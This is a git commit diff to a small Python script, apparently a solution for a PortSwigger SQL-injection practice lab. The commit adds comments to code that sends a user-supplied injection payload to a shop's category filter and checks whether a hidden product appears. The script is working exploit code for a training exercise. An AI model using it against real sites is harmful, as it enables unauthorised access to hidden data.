f240dc53aaac4dd0651d76b7f23d0522fb084f1d
musagulfam <104184763+musagulfam@users.noreply.github.com>
2023-09-28 10:42:13 +0500

    Updated Lab-1.py

--- Lab-1.py
+++ Lab-1.py
@@ -1,3 +1,4 @@
+# You have to give the url of portswigger lab and then type the pyload in terminal and then just press Enter.
 import requests
 import sys
 import urllib3
@@ -7,13 +8,16 @@ proxies = {'http': 'http://172.16.0.6:80', 'https': 'http://172.16.0.6:80'}
 
 def exploit_sqli(url, payload):
     uri = '/filter?category='
+    # Saving the request into a r file.
     r = requests.get(url + uri + payload, verify=False, proxies=proxies)
+    # Cheacking the hidden product in the list of r.
     if "Pest Control Umbrella" in r.text:
         return True
     else:
         return False
 
 if __name__ == "__main__":
+    # Getting input in the termianl "argv[1] is url you have give in the terminal" and " after it argv[2] the payload you will use for ending the task.
     try:
         url = sys.argv[1].strip()
         payload = sys.argv[2].strip()
